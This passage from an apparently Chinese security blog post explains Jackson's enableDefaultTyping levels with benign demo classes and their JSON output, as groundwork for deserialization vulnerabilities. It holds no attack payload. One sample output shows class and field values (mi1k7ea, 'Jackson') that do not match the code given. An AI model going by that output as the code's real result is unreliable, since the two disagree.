是第二个设置，OBJECT_AND_NON_CONCRETE。</strong></p><p>下面分别对这几个选项进行说明。</p><h4 id="JAVA-LANG-OBJECT"><a href="#JAVA-LANG-OBJECT" class="headerlink" title="JAVA_LANG_OBJECT"></a>JAVA_LANG_OBJECT</h4><p>JAVA_LANG_OBJECT：当被序列化或反序列化的类里的属性被声明为一个 Object 类型时，会对该 Object 类型的属性进行序列化和反序列化，并且明确规定类名。（当然，这个 Object 本身也得是一个可被序列化的类）</p><p>添加一个 Hacker 类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby.defaultTyping;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hacker</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">skill</span> <span class="operator">=</span> <span class="string">&quot;hiphop&quot;</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改 Person 类，添加 Object 类型属性：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;  </span><br><span class="line">    <span class="keyword">public</span> String name;  </span><br><span class="line">    <span class="keyword">public</span> Object object;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;Person.age=%d, Person.name=%s, %s&quot;</span>, age, name, object == <span class="literal">null</span> ? <span class="string">&quot;null&quot;</span> : object);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>新建 <code>JAVA_LANG_OBJECTTest.java</code>，添加 <code>enableDefaultTyping()</code> 并设置为 <code>JAVA_LANG_OBJECT</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby.defaultTyping;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.drunkbaby.Person;  </span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JAVA_LANG_OBJECTTest</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();  </span><br><span class="line">        p.age = <span class="number">6</span>;  </span><br><span class="line">        p.name = <span class="string">&quot;drunkbaby&quot;</span>;  </span><br><span class="line">        p.object = <span class="keyword">new</span> <span class="title class_">Hacker</span>();  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">        <span class="comment">// 设置JAVA_LANG_OBJECT  </span></span><br><span class="line">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> mapper.writeValueAsString(p);  </span><br><span class="line">        System.out.println(json);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">p2</span> <span class="operator">=</span> mapper.readValue(json, Person.class);  </span><br><span class="line">        System.out.println(p2);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们同样写一个类，是没有添加 <code>enableDefaultTyping()</code> 的，来对比一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby.defaultTyping;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.drunkbaby.Person;  </span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NoJava_LANG_OBJECT</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();  </span><br><span class="line">        p.age = <span class="number">6</span>;  </span><br><span class="line">        p.name = <span class="string">&quot;drunkbaby&quot;</span>;  </span><br><span class="line">        p.object = <span class="keyword">new</span> <span class="title class_">Hacker</span>();  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> mapper.writeValueAsString(p);  </span><br><span class="line">        System.out.println(json);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">p2</span> <span class="operator">=</span> mapper.readValue(json, Person.class);  </span><br><span class="line">        System.out.println(p2);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/compare.png" class><p>输出对比看到，通过 enableDefaultTyping() 设置设置 JAVA_LANG_OBJECT 后，会多输出 Hacker 类名，且在输出的 Object 属性时直接输出的是 Hacker 类对象，也就是说同时对 Object 属性对象进行了序列化和反序列化操作：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置JAVA_LANG_OBJECT  </span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">6</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;mi1k7ea&quot;</span><span class="punctuation">,</span><span class="attr">&quot;object&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;com.mi1k7ea.Hacker&quot;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;skill&quot;</span><span class="punctuation">:</span><span class="string">&quot;Jackson&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span>  </span><br><span class="line">Person.age=<span class="number">6</span><span class="punctuation">,</span> Person.name=mi1k7ea<span class="punctuation">,</span> com.mi1k7ea.Hacker@<span class="number">7</span>f9a81e8  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 未设置JAVA_LANG_OBJECT  </span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">6</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;mi1k7ea&quot;</span><span class="punctuation">,</span><span class="attr">&quot;object&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;skill&quot;</span><span class="punctuation">:</span><span class="string">&quot;Jackson&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span>  </span><br><span class="line">Person.age=<span class="number">6</span><span class="punctuation">,</span> Person.name=mi1k7ea<span class="punctuation">,</span> <span class="punctuation">&#123;</span>skill=Jackson<span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h4 id="OBJECT-AND-NON-CONCRETE"><a href="#OBJECT-AND-NON-CONCRETE" class="headerlink" title="OBJECT_AND_NON_CONCRETE"></a>OBJECT_AND_NON_CONCRETE</h4><p>OBJECT_AND_NON_CONCRETE：除了前面提到的特征，当类里有 Interface、AbstractClass 类时，对其进行序列化和反序列化（当然这些类本身需要时合法的、可被序列化的对象）。</p><ul><li>此外，<strong>enableDefaultTyping()默认的无参数的设置就是此选项。</strong></li></ul><p>添加一个 Sex 接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby.defaultTyping.object_and_non_concrete;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Sex</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSex</span><span class="params">(<span class="type">int</span> sex)</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getSex</span><span class="params">()</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>添加 MySex 类实现 Sex 接口类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby.defaultTyping.object_and_non_concrete;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MySex</span> <span class="keyword">implements</span> <span class="title class_">Sex</span> &#123;  </span><br><span class="line">    <span class="type">int</span> sex;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getSex</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> sex;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSex</span><span class="params">(<span class="type">int</span> sex)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.sex = sex;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改 Person 类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;  </span><br><span class="line">    <span class="keyword">public</span> String name;  </span><br><span class="line">    <span class="keyword">public</span> Object object;  </span><br><span class="line">    <span class="keyword">public</span> Sex sex;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;Person.age=%d, Person.name=%s, %s, %s&quot;</span>, age, name, object == <span class="literal">null</span> ? <span class="string">&quot;null&quot;</span> : object, sex == <span class="literal">null</span> ? <span class="string">&quot;null&quot;</span> : sex);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着编写序列化与反序列化的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby.defaultTyping.object_and_non_concrete;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.drunkbaby.Person;  </span><br><span class="line"><span class="keyword">import</span> com.drunkbaby.defaultTyping.java_lang_object.Hacker;  </span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OBJECT_AND_NON_CONCRETE_Test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();  </span><br><span class="line">        p.age = <span class="number">6</span>;  </span><br><span class="line">        p.name = <span class="string">&quot;drunkbaby&quot;</span>;  </span><br><span class="line">        p.object = <span class="keyword">new</span> <span class="title class_">Hacker</span>();  </span><br><span class="line">        p.sex = <span class="keyword">new</span> <span class="title class_">MySex</span>();  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">        <span class="comment">// 设置OBJECT_AND_NON_CONCRETE  </span></span><br><span class="line">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE);  </span><br><span class="line">        <span class="comment">// 或直接无参调用，输出一样  </span></span><br><span class="line">        <span class="comment">//mapper.enableDefaultTyping();  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> mapper.writeValueAsString(p);  </span><br><span class="line">        System.out.println(json);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">p2</span> <span class="operator">=</span> mapper.readValue(json, Person.class);  </span><br><span class="line">        System.out.println(p2);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出，可以看到该Interface类属性被成功序列化和反序列化：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">6</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;drunkbaby&quot;</span><span class="punctuation">,</span><span class="attr">&quot;object&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;com.drunkbaby.defaultTyping.java_lang_object.Hacker&quot;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;skill&quot;</span><span class="punctuation">:</span><span class="string">&quot;hiphop&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="attr">&quot;sex&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;com.drunkbaby.defaultTyping.object_and_non_concrete.MySex&quot;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;sex&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br><span class="line">Person.age=<span class="number">6</span><span class="punctuation">,</span> Person.name=drunkbaby<span class="punctuation">,</span> com.drunkbaby.defaultTyping.java_lang_object.Hacker@<span class="number">6</span>d00a15d<span class="punctuation">,</span> com.drunkbaby.defaultTyping.object_and_non_concrete.MySex@<span class="number">51</span>efea79</span><br></pre></td></tr></table></figure><h4 id="NON-CONCRETE-AND-ARRAYS"><a href="#NON-CONCRETE-AND-ARRAYS" class="headerlink" title="NON_CONCRETE_AND_ARRAYS"></a>NON_CONCRETE_AND_ARRAYS</h4><p>NON_CONCRETE_AND_ARRAYS：除了前面提到的特征外，还支持 Array 类型。</p><p>编写序列化与反序列化的代码，在 Object 属性中存在的是数组：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby.defaultTyping.non_concrete_and_arrays;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.drunkbaby.Person;  </span><br><span class="line"><span class="keyword">import</span> com.drunkbaby.defaultTyping.java_lang_object.Hacker;  </span><br><span class="line"><span class="keyword">import</span> com.drunkbaby.defaultTyping.object_and_non_concrete.MySex;  </span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NON_CONCRETE_AND_ARRAYS_Test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();  </span><br><span class="line">        p.age = <span class="number">6</span>;  </span><br><span class="line">        p.name = <span class="string">&quot;drunkbaby&quot;</span>;  </span><br><span class="line">        Hacker[] hackers = <span class="keyword">new</span> <span class="title class_">Hacker</span>[<span class="number">2</span>];  </span><br><span class="line">        hackers[<span class="number">0</span>] = <span class="keyword">new</span> <span class="title class_">Hacker</span>();  </span><br><span class="line">        hackers[<span class="number">1</span>] = <span class="keyword">new</span> <span class="title class_">Hacker</span>();  </span><br><span class="line">        p.object = hackers;  </span><br><span class="line">        p.sex = <span class="keyword">new</span> <span class="title class_">MySex</span>();  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">        <span class="comment">// 设置NON_CONCRETE_AND_ARRAYS  </span></span><br><span class="line">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_CONCRETE_AND_ARRAYS);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> mapper.writeValueAsString(p);  </span><br><span class="line">        System.out.println(json);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">p2</span> <span class="operator">=</span> mapper.readValue(json, Person.class);  </span><br><span class="line">        System.out.println(p2);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出看到，类名变成了 <code>”[L”+类名+”;”</code>，序列化 Object 之后为数组形式，反序列化之后得到<code>[Lcom.mi1k7ea.Hacker;</code> 类对象，说明对 Array 类型成功进行了序列化和反序列化：</p><h4 id="NON-FINAL"><a href="#NON-FINAL" class="headerlink" title="NON_FINAL"></a>NON_FINAL</h4><p>NON_FINAL：除了前面的所有特征外，包含即将被序列化的类里的全部、非 final 的属性，也就是相当于整个类、除 final 外的属性信息都需要被序列化和反序列化。</p><p>修改 Person 类，添加 Hacker 属性：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;  </span><br><span class="line">    <span class="keyword">public</span> String name;  </span><br><span class="line">    <span class="keyword">public</span> Object object;  </span><br><span class="line">    <span class="keyword">public</span> Sex sex;  </span><br><span class="line">    <span class="keyword">public</span> Hacker hacker;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;Person.age=%d, Person.name=%s, %s, %s, %s&quot;</span>, age, name, object == <span class="literal">null</span> ? <span class="string">&quot;null&quot;</span> : object, sex == <span class="literal">null</span> ? <span class="string">&quot;null&quot;</span> : sex, hacker == <span class="literal">null</span> ? <span class="string">&quot;null&quot;</span> : hacker);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编写序列化与反序列化类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby.defaultTyping.non_final;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.drunkbaby.Person;  </span><br><span class="line"><span class="keyword">import</span> com.drunkbaby.defaultTyping.java_lang_object.Hacker;  </span><br><span class="line"><span class="keyword">import</span> com.drunkbaby.defaultTyping.object_and_non_concrete.MySex;  </span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NON_FINAL_Test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();  </span><br><span class="line">        p.age = <span class="number">6</span>;  </span><br><span class="line">        p.name = <span class="string">&quot;drunkbaby&quot;</span>;  </span><br><span class="line">        p.object = <span class="keyword">new</span> <span class="title class_">Hacker</span>();  </span><br><span class="line">        p.sex = <span class="keyword">new</span> <span class="title class_">MySex</span>();  </span><br><span class="line">        p.hacker = <span class="keyword">new</span> <span class="title class_">Hacker</span>();  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">        <span class="comment">// 设置NON_FINAL  </span></span><br><span class="line">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> mapper.writeValueAsString(p);  </span><br><span class="line">        System.out.println(json);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">p2</span> <span class="operator">=</span> mapper.readValue(json, Person.class);  </span><br><span class="line">        System.out.println(p2);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出看到，成功对非 final 的 hacker 属性进行序列化和反序列化：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">[</span><span class="string">&quot;com.drunkbaby.Person&quot;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">6</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;drunkbaby&quot;</span><span class="punctuation">,</span><span class="attr">&quot;object&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;com.drunkbaby.defaultTyping.java_lang_object.Hacker&quot;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;skill&quot;</span><span class="punctuation">:</span><span class="string">&quot;hiphop&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="attr">&quot;sex&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;com.drunkbaby.defaultTyping.object_and_non_concrete.MySex&quot;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;sex&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="attr">&quot;hacker&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;com.drunkbaby.defaultTyping.java_lang_object.Hacker&quot;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;skill&quot;</span><span class="punctuation">:</span><span class="string">&quot;hiphop&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line">Person.age=<span class="number">6</span><span class="punctuation">,</span> Person.name=drunkbaby<span class="punctuation">,</span> com.drunkbaby.defaultTyping.java_lang_object.Hacker@<span class="number">6</span>d00a15d<span class="punctuation">,</span> com.drunkbaby.defaultTyping.object_and_non_concrete.MySex@<span class="number">51</span>efea79<span class="punctuation">,</span> com.drunkbaby.defaultTyping.java_lang_object.Hacker@<span class="number">5034</span>c75a</span><br></pre></td></tr></table></figure><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>从前面的分析知道，DefaultTyping 的几个设置选项是逐渐扩大适用范围的，如下表：</p><table><thead><tr><th>DefaultTyping类型</th><th>描述说明</th></tr></thead><tbody><tr><td>JAVA_LANG_OBJECT</td><td>属性的类型为Object</td></tr><tr><td>OBJECT_AND_NON_CONCRETE</td><td>属性的类型为Object、Interface、AbstractClass</td></tr><tr><td>NON_CONCRETE_AND_ARRAYS</td><td>属性的类型为Object、Interface、AbstractClass、Array</td></tr><tr><td>NON_FINAL</td><td>所有除了声明为final之外的属性</td></tr></tbody></table><h3 id="JsonTypeInfo-注解"><a href="#JsonTypeInfo-注解" class="headerlink" title="@JsonTypeInfo 注解"></a>@JsonTypeInfo 注解</h3><p><code>@JsonTypeInfo</code> 注解是 Jackson 多态类型绑定的一种方式，支持下面5种类型的取值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.NONE)</span>  </span><br><span class="line"><span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)</span>  </span><br><span class="line"><span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)</span>  </span><br><span class="line"><span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.NAME)</span>  </span><br><span class="line"><span 